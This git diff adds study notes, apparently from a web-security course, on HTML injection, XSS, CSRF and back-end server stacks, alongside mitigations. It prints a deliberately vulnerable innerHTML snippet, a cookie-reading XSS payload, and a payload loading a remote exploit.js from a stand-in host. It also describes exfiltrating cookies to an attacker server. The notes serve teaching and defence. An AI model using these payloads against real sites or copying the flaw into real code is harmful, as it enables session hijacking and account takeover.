@@ -439,3 +439,157 @@ To mitigate Sensitive Data Exposure on the client-side, the following practices 
 * **Data Classification:** Strictly classify data types and enforce access controls to determine what is permissible for client-side exposure.
 * **Obfuscation & Packing:** Utilize JavaScript minification, packing, and obfuscation techniques to complicate reverse-engineering and deter automated scraping tools.
 * **Code Review Pipeline:** Integrate mandatory peer reviews and automated SAST (Static Application Security Testing) tools into the CI/CD pipeline prior to deployment to catch exposed information.
+
+# Frontend Security: HTML Injection & Input Validation
+
+## 1. Overview
+Validating and sanitizing accepted user input is a critical component of modern web security. While input validation is traditionally handled on the backend, certain architectures process and render user input entirely on the client side (frontend) without it ever reaching the server. Therefore, implementing robust input sanitization on both layers (Frontend and Backend) is a mandatory security practice.
+
+**HTML Injection** occurs when a web application receives unfiltered user input and dynamically renders it on the page. This vulnerability generally manifests in two primary ways:
+* **Stored/Persistent:** Retrieving previously submitted malicious payloads from a backend database (e.g., retrieving an unsanitized user comment).
+* **Reflected/DOM-based:** Directly displaying unfiltered input via JavaScript locally on the frontend.
+
+## 2. Security Impact
+When an attacker has arbitrary control over how input is rendered, they can inject malicious HTML tags. The browser executes this as part of the Document Object Model (DOM), leading to severe consequences:
+* **Credential Harvesting:** Injecting rogue HTML elements, such as external login forms, designed to spoof authentication prompts and siphon user credentials to an attacker-controlled server.
+* **Web Page Defacement:** Overwriting the DOM to alter the site's visual appearance, insert unauthorized advertisements, or cause reputational damage to the organization hosting the application.
+
+## 3. Proof of Concept (PoC): DOM-Based HTML Injection
+
+### 3.1. Vulnerable Code Analysis
+The following HTML snippet demonstrates a highly vulnerable implementation. The JavaScript function `inputFunction()` captures user input via a `prompt()` dialogue and injects it directly into the DOM using the dangerous `.innerHTML` property without prior sanitization or encoding.
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+    <button onclick="inputFunction()">Click to enter your name</button>
+    <p id="output"></p>
+
+    <script>
+        function inputFunction() {
+            var input = prompt("Please enter your name", "");
+            
+            // VULNERABILITY: Directly rendering unfiltered input via innerHTML
+            if (input != null) {
+                document.getElementById("output").innerHTML = "Your name is " + input;
+            }
+        }
+    </script>
+</body>
+</html>
+```
+
+### 3.2. Exploitation Phase
+To verify the HTML Injection vulnerability, we can supply a payload designed to alter the DOM's structure. In this scenario, we inject CSS via HTML `<style>` tags to overwrite the `background-image` property of the `body` element.
+
+**Malicious Payload:**
+```html
+<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
+```
+
+**Execution & Result:**
+Upon submitting the payload through the prompt, the `.innerHTML` property parses the `<style>` tag natively. The browser instantly applies the styling, replacing the page's background with the target external SVG image. 
+
+*Note on Persistence:* Since this specific PoC is DOM-based and executed entirely on the client's frontend session, the injected payload is non-persistent. A simple browser refresh will clear the injected HTML and restore the DOM to its default state.
+
+# Cross-Site Scripting (XSS)
+
+## Overview
+HTML Injection vulnerabilities often serve as a stepping stone for Cross-Site Scripting (XSS) attacks. While HTML Injection is limited to rendering rogue markup, XSS escalates the threat by injecting malicious JavaScript code that executes directly on the client side. Achieving arbitrary code execution within the victim's browser can lead to account takeover, session hijacking, or deeper client-side exploitation.
+
+## XSS vs. HTML Injection
+Though similar in their execution methodology and reliance on poor input sanitization, the primary distinction lies in the payload. XSS specifically leverages JavaScript to perform advanced client-side attacks, whereas HTML Injection is generally restricted to altering the page's structural or visual integrity.
+
+## Primary Types of XSS
+
+| Type | Description |
+| :--- | :--- |
+| **Reflected XSS** | Occurs when malicious user input is immediately returned (reflected) by the web application—such as in an error message or search result—without proper sanitization or encoding. |
+| **Stored XSS** | Arises when a malicious payload is permanently stored on the target server (e.g., in a database via forum posts or comment sections) and executes whenever victims retrieve the affected data. |
+| **DOM-based XSS** | Exploits vulnerabilities within the client-side code rather than the server backend. The payload is written directly to an HTML Document Object Model (DOM) object within the browser (e.g., manipulating the page title or URL parameters). |
+
+## Proof of Concept (PoC): DOM XSS Cookie Stealing
+In environments lacking proper input sanitization (similar to basic HTML Injection scenarios), DOM-based XSS can be easily exploited to retrieve sensitive session data. 
+
+### Payload Execution
+```javascript
+#"><img src=/ onerror=alert(document.cookie)>
+```
+
+### Attack Mechanism
+1. **Injection:** The payload is injected into a vulnerable input field.
+2. **DOM Manipulation:** The browser processes the input, interpreting it as a completely new DOM element.
+3. **Execution:** The `onerror` event handler triggers the JavaScript `alert(document.cookie)`, accessing the HTML document tree to retrieve the current session cookie object and displaying it in a pop-up dialog.
+4. **Impact:** In a real-world scenario, instead of simply alerting the user, an attacker would replace the `alert` function with a request (e.g., using `fetch()` or `XMLHttpRequest`) to silently exfiltrate the `document.cookie` value to an attacker-controlled server. This enables session hijacking, allowing the attacker to authenticate as the victim without requiring credentials.
+
+# Cross-Site Request Forgery (CSRF)
+
+## 1. Vulnerability Overview
+Cross-Site Request Forgery (CSRF) is a client-side vulnerability where an attacker coerces an authenticated user into executing unauthorized actions on a web application. By exploiting the application's trust in the victim's active session, attackers can hijack queries and API calls. CSRF is frequently chained with Cross-Site Scripting (XSS) or manipulates HTTP parameters to seamlessly execute malicious requests on behalf of the victim.
+
+## 2. Exploitation Scenarios
+
+### 2.1. Account Takeover via Password Reset
+A classic CSRF vector targets the account management functionality. An attacker crafts a JavaScript payload designed to force a password change to an attacker-controlled value.
+* **Execution:** The payload is injected into a vulnerable endpoint (e.g., a stored XSS vulnerability within a comment section).
+* **Impact:** When the authenticated victim views the malicious entry, the payload executes automatically in the background, leveraging the active session to change the password. The attacker then logs in, resulting in a full account takeover.
+
+### 2.2. Privilege Escalation Targeting Administrators
+Administrators possess highly sensitive privileges that, if compromised, can lead to complete back-end server control. Instead of extracting session cookies (which might be protected by `HttpOnly` flags), attackers can force the admin's browser to execute administrative functions.
+* **Payload Delivery:** Rather than embedding the entire script inline, attackers often load remote malicious scripts:
+    ```html
+    "><script src=//www.example.com/exploit.js></script>
+    ```
+* **Mechanics:** The `exploit.js` file is custom-built after analyzing the target application's APIs and state-changing procedures. Once triggered by the admin, the script replicates the required HTTP requests to execute privileged actions automatically.
+
+## 3. Prevention & Mitigation Strategies
+
+Robust defense against CSRF and related injection attacks (like XSS) requires a defense-in-depth approach, validating and sanitizing data across both front-end and back-end environments.
+
+### 3.1. Input Handling
+While back-end validation is mandatory, applying front-end controls prevents malicious payloads from rendering on the client side even if back-end filters fail.
+
+| Control | Description |
+| :--- | :--- |
+| **Sanitization** | Stripping or encoding special and non-standard characters from user input before processing, storing, or displaying it (Output Encoding). |
+| **Validation** | Verifying that the submitted input strictly matches the expected format, length, and type (e.g., ensuring an email field only accepts a valid email address structure). |
+
+### 3.2. Defense-in-Depth Mechanisms
+* **Anti-CSRF Tokens:** Implement unique, unpredictable, and session-specific tokens for every state-changing request. The server must validate this token before processing the transaction.
+* **SameSite Cookie Attribute:** Enforce `SameSite=Strict` or `SameSite=Lax` on session cookies to instruct the browser not to send authentication cookies alongside cross-origin requests.
+* **Re-Authentication:** Require users to input their current password or complete a multi-factor authentication (MFA) prompt before executing highly sensitive actions (e.g., changing passwords, updating emails).
+* **Web Application Firewalls (WAF):** Deploy a WAF to automatically detect and block common injection patterns. *Note: WAFs serve as an additional security layer and should never replace secure coding practices, as their rulesets can often be bypassed.*
+
+> **Security Mindset:** Modern browsers implement built-in protections against automatic JS execution, and frameworks offer native Anti-CSRF mechanisms. However, misconfigurations or chaining vulnerabilities can bypass these safeguards. Applications must be secure by design, treating these mechanisms as complementary layers rather than absolute fixes.
+
+# Web Application Architecture: Back-End Servers
+
+## 1. Overview
+A **back-end server** constitutes the underlying hardware and operating system environment hosting the applications required to run a web service. Functioning within the **Data Access Layer**, it acts as the core computational engine, executing all internal processes and transactions that drive the web application ecosystem.
+
+## 2. Software Architecture
+The back-end environment typically integrates three primary software components to process client requests and manage data:
+
+1. **Web Server:** Handles HTTP/HTTPS requests and serves content (e.g., Apache, NGINX, IIS).
+2. **Database Management System (DBMS):** Stores, retrieves, and manages structured/unstructured data (e.g., MySQL, MS SQL, Oracle).
+3. **Development Framework:** The backend logic and application codebase (e.g., PHP, C#, Java, Node.js).
+
+> **Infrastructure Note:** Beyond the core components, modern enterprise back-ends frequently deploy supplementary layers such as **Hypervisors** (for VM management), **Containers** (e.g., Docker for microservices), and **Web Application Firewalls (WAFs)** to harden the security perimeter against Layer 7 attacks.
+
+### 2.1 Common Web Solution Stacks
+Back-end components are routinely standardized into specific "stacks" to streamline deployment and ensure compatibility. The most prevalent combinations include:
+
+| Stack | Operating System | Web Server | Database | Language |
+| :--- | :--- | :--- | :--- | :--- |
+| **LAMP** | Linux | Apache | MySQL | PHP / Python / Perl |
+| **WAMP** | Windows | Apache | MySQL | PHP / Python / Perl |
+| **WINS** | Windows | IIS | SQL Server | .NET / C# |
+| **MAMP** | macOS | Apache | MySQL | PHP / Python / Perl |
+| **XAMPP**| Cross-Platform | Apache | MariaDB/MySQL | PHP / Perl |
+
+## 3. Hardware & Infrastructure Scalability
+The underlying hardware specifications (CPU, RAM, I/O throughput) directly dictate the application's stability and responsiveness. However, modern infrastructure design moves away from monolithic, single-server deployments to ensure High Availability (HA) and fault tolerance:
+
+* **Load Distribution:** Enterprise web applications distribute incoming traffic across a cluster of back-end servers (using Load Balancers) to optimize resource utilization and prevent bottlenecks.
+* **Virtualization & Cloud:** Applications increasingly run on abstracted hardware, utilizing virtual hosts provisioned through data centers or Cloud Service Providers (IaaS/PaaS) rather than relying exclusively on bare-metal servers.
